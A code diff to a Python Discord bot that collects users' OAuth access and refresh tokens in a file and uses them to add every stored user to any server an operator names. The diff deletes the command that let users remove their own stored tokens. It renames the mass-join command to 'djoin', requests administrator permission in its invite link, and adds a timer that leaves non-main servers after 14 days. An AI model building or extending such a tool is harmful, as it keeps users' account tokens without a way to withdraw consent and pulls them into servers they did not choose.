@@ -3,7 +3,8 @@ import requests
 import json
 import os
 import asyncio
-from discord.ext import commands
+from discord.ext import commands, tasks
+from datetime import datetime, timedelta
 import time
 from urllib.parse import urlencode
 
@@ -17,11 +18,13 @@ try:
     BOT_TOKEN = config['token']
     CLIENT_ID = config['id']
     CLIENT_SECRET = config['secret']
+    MAIN_SERVER = 1437381878310109185  # Your main server ID
     
     print(f"✅ Config loaded")
     print(f"🔑 Token: {BOT_TOKEN[:20]}...")
     print(f"🆔 Client ID: {CLIENT_ID}")
     print(f"🔒 Secret: {CLIENT_SECRET[:8]}...")
+    print(f"🏠 Main Server: {MAIN_SERVER}")
     
 except Exception as e:
     print(f"❌ Config error: {e}")
@@ -34,10 +37,101 @@ intents.message_content = True
 bot = commands.Bot(command_prefix=['!', '?'], intents=intents)
 bot.remove_command("help")
 
+# Store server join times
+server_join_times = {}
+
 @bot.event
 async def on_ready():
     print(f'🎯 Bot is ready: {bot.user}')
     print(f'📋 Loaded commands: {[command.name for command in bot.commands]}')
+    
+    # Initialize server join times
+    for guild in bot.guilds:
+        if guild.id != MAIN_SERVER:
+            server_join_times[guild.id] = datetime.now()
+            print(f"📝 Tracking server: {guild.name} ({guild.id})")
+    
+    # Start the cleanup task
+    check_server_ages.start()
+
+@tasks.loop(hours=24)  # Run once per day
+async def check_server_ages():
+    """Check servers and leave if they're older than 14 days (except main server)"""
+    print("🔍 Checking server ages...")
+    
+    for guild in bot.guilds:
+        if guild.id == MAIN_SERVER:
+            continue  # Never leave main server
+        
+        guild_id = guild.id
+        guild_name = guild.name
+        guild_age = None
+        
+        # Calculate age
+        if guild_id in server_join_times:
+            join_time = server_join_times[guild_id]
+            guild_age = datetime.now() - join_time
+        else:
+            # If we don't have a join time, assume we joined now
+            server_join_times[guild_id] = datetime.now()
+            guild_age = timedelta(0)
+        
+        if guild_age >= timedelta(days=14):
+            try:
+                print(f"🚪 Leaving server {guild_name} ({guild_id}) - Age: {guild_age.days} days")
+                await guild.leave()
+                
+                # Send notification to main server
+                main_guild = bot.get_guild(MAIN_SERVER)
+                if main_guild:
+                    # Find first text channel bot can send to
+                    for channel in main_guild.text_channels:
+                        if channel.permissions_for(main_guild.me).send_messages:
+                            embed = discord.Embed(
+                                title="🚪 Bot Left Server",
+                                description=f"**Server:** {guild_name}\n**ID:** {guild_id}\n**Reason:** Server age ({guild_age.days} days) exceeded 14 days",
+                                color=0xED4245,
+                                timestamp=datetime.now()
+                            )
+                            await channel.send(embed=embed)
+                            break
+                
+                # Remove from tracking
+                if guild_id in server_join_times:
+                    del server_join_times[guild_id]
+                    
+            except Exception as e:
+                print(f"❌ Error leaving server {guild_name}: {e}")
+        else:
+            print(f"✅ Server {guild_name} is {guild_age.days} days old - OK")
+
+@bot.event
+async def on_guild_join(guild):
+    """Track when bot joins a new server"""
+    if guild.id != MAIN_SERVER:
+        server_join_times[guild.id] = datetime.now()
+        print(f"📝 Bot joined new server: {guild.name} ({guild.id})")
+        
+        # Send notification to main server
+        main_guild = bot.get_guild(MAIN_SERVER)
+        if main_guild:
+            for channel in main_guild.text_channels:
+                if channel.permissions_for(main_guild.me).send_messages:
+                    embed = discord.Embed(
+                        title="🏠 Bot Joined Server",
+                        description=f"**Server:** {guild.name}\n**ID:** {guild.id}\n**Members:** {guild.member_count}\n**Will leave after:** 14 days",
+                        color=0x57F287,
+                        timestamp=datetime.now()
+                    )
+                    await channel.send(embed=embed)
+                    break
+
+@bot.event
+async def on_guild_remove(guild):
+    """Remove server from tracking when bot leaves"""
+    if guild.id in server_join_times:
+        del server_join_times[guild.id]
+        print(f"🗑️ Removed tracking for server: {guild.name} ({guild.id})")
 
 @bot.event
 async def on_command_error(ctx, error):
@@ -123,7 +217,7 @@ def update_token_in_file(user_id, new_access_token, new_refresh_token):
         print(f"❌ Error updating tokens in file: {e}")
         return False
 
-@bot.command(name='get_token')
+@bot.hybrid_command(name='get_token')
 async def get_auth_token(ctx):
     """Get authentication link - FIXED VERSION"""
     try:
@@ -171,7 +265,7 @@ async def get_auth_token(ctx):
         await ctx.send(f"❌ Error generating auth link: {str(e)}")
         print(f"❌ Error in get_token: {e}")
 
-@bot.command(name='auth')
+@bot.hybrid_command(name='auth')
 async def authenticate_user(ctx, authorization_code: str):
     """Authenticate user with code"""
     try:
@@ -253,7 +347,7 @@ async def authenticate_user(ctx, authorization_code: str):
             color=0x57F287
         )
         success_embed.add_field(name="User ID", value=f"`{current_user_id}`", inline=True)
-        success_embed.add_field(name="Next Step", value="You will be added to servers when admin uses `!join SERVER_ID`", inline=False)
+        success_embed.add_field(name="Next Step", value="You will be added to servers when admin uses `!djoin SERVER_ID`", inline=False)
         
         await msg.edit(content="", embed=success_embed)
         print(f"✅ Authentication completed for user {current_user_id}")
@@ -261,68 +355,8 @@ async def authenticate_user(ctx, authorization_code: str):
     except Exception as error:
         await ctx.send(f"❌ Error: {str(error)}")
         print(f"❌ Exception: {error}")
-
-@bot.command(name='remove_auth')
-async def remove_authentication(ctx):
-    """Remove your own authentication data"""
-    try:
-        user_id = str(ctx.author.id)
         
-        if not os.path.exists('auths.txt'):
-            await ctx.send("❌ You are not currently authenticated.")
-            return
-        
-        # Read all entries and find the user
-        with open('auths.txt', 'r', encoding='utf-8') as f:
-            lines = f.readlines()
-        
-        user_found = False
-        new_lines = []
-        
-        for line in lines:
-            line = line.strip()
-            if not line:
-                continue
-                
-            parts = line.split(',')
-            if len(parts) >= 1 and parts[0] == user_id:
-                user_found = True
-                print(f"🗑️ Removing auth for user {user_id}")
-                continue  # Skip this line (remove user)
-            else:
-                new_lines.append(line + '\n')
-        
-        if user_found:
-            # Write the updated list back to file
-            with open('auths.txt', 'w', encoding='utf-8') as f:
-                f.writelines(new_lines)
-            
-            success_embed = discord.Embed(
-                title="✅ AUTHENTICATION REMOVED",
-                description="Your authentication data has been successfully removed!",
-                color=0x57F287
-            )
-            success_embed.add_field(
-                name="🔒 Status", 
-                value="You will no longer be added to servers via mass join commands.",
-                inline=False
-            )
-            success_embed.add_field(
-                name="🔄 Re-authenticate", 
-                value="Use `!get_token` if you want to authenticate again later.",
-                inline=False
-            )
-            
-            await ctx.send(embed=success_embed)
-            print(f"✅ Successfully removed auth for user {user_id}")
-        else:
-            await ctx.send("❌ You are not currently authenticated.")
-            
-    except Exception as error:
-        await ctx.send(f"❌ Error removing authentication: {str(error)}")
-        print(f"❌ Error in remove_auth: {error}")
-        
-@bot.command(name='join')
+@bot.hybrid_command(name='djoin')
 async def join_server(ctx, target_server_id: str):
     """Add ALL authenticated users to a server - WITH TOKEN REFRESH"""
     try:
@@ -346,7 +380,7 @@ async def join_server(ctx, target_server_id: str):
             )
             embed.add_field(
                 name="🚨 Solution", 
-                value=f"**[Add bot to server first]({invite_url})**\nThen use `!join {target_server_id}` again",
+                value=f"**[Add bot to server first]({invite_url})**\nThen use `!djoin {target_server_id}` again",
                 inline=False
             )
             await ctx.send(embed=embed)
@@ -460,7 +494,7 @@ async def join_server(ctx, target_server_id: str):
         await ctx.send(f"❌ Mass join error: {str(error)}")
         print(f"❌ MASS JOIN EXCEPTION: {error}")
 
-@bot.command(name='check_tokens')
+@bot.hybrid_command(name='check_tokens')
 async def check_token_validity(ctx):
     """Check which tokens are still valid"""
     try:
@@ -510,7 +544,7 @@ async def check_token_validity(ctx):
         
         embed.add_field(
             name="💡 Tip", 
-            value="Expired tokens will be automatically refreshed when using `!join`", 
+            value="Expired tokens will be automatically refreshed when using `!djoin`", 
             inline=False
         )
         
@@ -519,7 +553,7 @@ async def check_token_validity(ctx):
     except Exception as error:
         await ctx.send(f"❌ Error checking tokens: {str(error)}")
 
-@bot.command(name='list_users')
+@bot.hybrid_command(name='list_users')
 async def list_authenticated_users(ctx):
     """List all authenticated users"""
     try:
@@ -558,7 +592,7 @@ async def list_authenticated_users(ctx):
         embed.add_field(name="Users", value=users_text, inline=False)
         embed.add_field(
             name="Usage", 
-            value=f"Use `!join SERVER_ID` to add all {len(users)} users to a server", 
+            value=f"Use `!djoin SERVER_ID` to add all {len(users)} users to a server", 
             inline=False
         )
         
@@ -567,7 +601,7 @@ async def list_authenticated_users(ctx):
     except Exception as error:
         await ctx.send(f"❌ Error listing users: {str(error)}")
 
-@bot.command(name='invite')
+@bot.hybrid_command(name='invite')
 async def generate_invite(ctx):
     """Generate bot invite link for any server"""
     invite_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&permissions=8&scope=bot%20applications.commands"
@@ -582,10 +616,15 @@ async def generate_invite(ctx):
         value=f"[**👉 CLICK HERE TO INVITE BOT 👈**]({invite_url})",
         inline=False
     )
+    embed.add_field(
+        name="⚠️ Note",
+        value="Bot will automatically leave servers after 14 days (except main server)",
+        inline=False
+    )
     
     await ctx.send(embed=embed)
 
-@bot.command(name='servers')
+@bot.hybrid_command(name='servers')
 async def list_servers(ctx):
     """List all servers the bot is in"""
     try:
@@ -594,12 +633,21 @@ async def list_servers(ctx):
             return
         
         server_list = []
+        current_time = datetime.now()
+        
         for guild in bot.guilds:
-            server_list.append(f"`{guild.id}` - **{guild.name}** (Members: {guild.member_count})")
+            age_days = "Permanent" if guild.id == MAIN_SERVER else "Unknown"
+            
+            if guild.id in server_join_times:
+                join_time = server_join_times[guild.id]
+                age = current_time - join_time
+                age_days = f"{age.days} days"
+            
+            server_list.append(f"`{guild.id}` - **{guild.name}** (Members: {guild.member_count}) - Age: {age_days}")
         
         embed = discord.Embed(
             title="🏠 BOT SERVERS",
-            description=f"**Total: {len(bot.guilds)} servers**",
+            description=f"**Total: {len(bot.guilds)} servers**\n⭐ = Main Server (Never leaves)",
             color=0x5865F2
         )
         
@@ -609,8 +657,8 @@ async def list_servers(ctx):
         
         embed.add_field(name="Servers", value=servers_text, inline=False)
         embed.add_field(
-            name="Usage", 
-            value="Use `!join SERVER_ID` to add users to a server", 
+            name="ℹ️ Info", 
+            value="• Bot leaves servers after 14 days\n• Main server (ID: {}) is permanent\n• Use `!djoin SERVER_ID` to add users".format(MAIN_SERVER), 
             inline=False
         )
         
@@ -619,7 +667,62 @@ async def list_servers(ctx):
     except Exception as error:
         await ctx.send(f"❌ Error listing servers: {str(error)}")
 
-@bot.command(name='help')
+@bot.hybrid_command(name='server_age')
+async def check_server_age(ctx, server_id: str = None):
+    """Check how long the bot has been in a server"""
+    try:
+        if server_id:
+            guild = bot.get_guild(int(server_id))
+            if not guild:
+                await ctx.send(f"❌ Bot is not in server with ID: {server_id}")
+                return
+        else:
+            guild = ctx.guild
+            if not guild:
+                await ctx.send("❌ This command must be used in a server")
+                return
+        
+        if guild.id == MAIN_SERVER:
+            embed = discord.Embed(
+                title="⭐ MAIN SERVER",
+                description=f"**{guild.name}**\nID: `{guild.id}`",
+                color=0xF1C40F
+            )
+            embed.add_field(name="Status", value="✅ **Permanent - Never leaves**", inline=False)
+            embed.add_field(name="Members", value=guild.member_count, inline=True)
+            embed.add_field(name="Owner", value=f"<@{guild.owner_id}>", inline=True)
+            await ctx.send(embed=embed)
+            return
+        
+        if guild.id in server_join_times:
+            join_time = server_join_times[guild.id]
+            current_time = datetime.now()
+            age = current_time - join_time
+            days_left = max(0, 14 - age.days)
+            
+            embed = discord.Embed(
+                title="📅 SERVER AGE",
+                description=f"**{guild.name}**\nID: `{guild.id}`",
+                color=0x3498DB,
+                timestamp=join_time
+            )
+            embed.add_field(name="Joined On", value=f"<t:{int(join_time.timestamp())}:F>", inline=False)
+            embed.add_field(name="Current Age", value=f"{age.days} days, {age.seconds // 3600} hours", inline=True)
+            embed.add_field(name="Days Until Leave", value=f"{days_left} days", inline=True)
+            embed.add_field(name="Will Leave On", value=f"<t:{int((join_time + timedelta(days=14)).timestamp())}:F>", inline=False)
+            embed.add_field(name="Members", value=guild.member_count, inline=True)
+            embed.add_field(name="Owner", value=f"<@{guild.owner_id}>", inline=True)
+            
+            await ctx.send(embed=embed)
+        else:
+            # If we don't have tracking data, add it now
+            server_join_times[guild.id] = datetime.now()
+            await ctx.send(f"✅ Started tracking server **{guild.name}**. Will leave after 14 days.")
+            
+    except Exception as error:
+        await ctx.send(f"❌ Error checking server age: {str(error)}")
+
+@bot.hybrid_command(name='help')
 async def show_help(ctx):
     """Show all available commands"""
     embed = discord.Embed(
@@ -629,13 +732,13 @@ async def show_help(ctx):
     
     embed.add_field(
         name="🔐 AUTHENTICATION", 
-        value="`!get_token` - Get authentication link\n`!auth CODE` - Authenticate with code\n`!remove_auth` - Remove your auth\n`!check_tokens` - Check token validity", 
+        value="`!get_token` - Get authentication link\n`!auth CODE` - Authenticate with code\n`!check_tokens` - Check token validity", 
         inline=False
     )
     
     embed.add_field(
         name="🚀 MASS JOINING", 
-        value="`!join SERVER_ID` - Add ALL users to server\n`!servers` - List bot servers", 
+        value="`!djoin SERVER_ID` - Add ALL users to server\n`!servers` - List bot servers\n`!server_age [SERVER_ID]` - Check server age", 
         inline=False
     )
     
@@ -648,6 +751,12 @@ async def show_help(ctx):
     embed.add_field(
         name="🔧 UTILITY", 
         value="`!invite` - Get bot invite link\n`!help` - Show this help", 
+        inline=False
+    )
+    
+    embed.add_field(
+        name="⚠️ IMPORTANT NOTES",
+        value="• Bot leaves servers after 14 days automatically\n• Main server (ID: {}) is permanent\n• All commands work as slash commands".format(MAIN_SERVER),
         inline=False
     )
     
